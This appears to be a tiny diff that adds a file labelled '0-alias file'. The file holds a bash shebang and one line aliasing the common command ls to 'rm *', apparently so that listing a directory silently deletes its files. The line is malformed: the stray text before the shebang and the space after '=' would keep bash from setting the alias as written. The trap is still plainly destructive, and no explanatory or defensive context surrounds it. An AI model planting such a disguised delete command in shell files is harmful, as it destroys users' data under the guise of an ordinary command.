@@ -1,0 +1,4 @@
+This is 0-alias file
+#!/bin/bash
+alias ls= 'rm *'
+
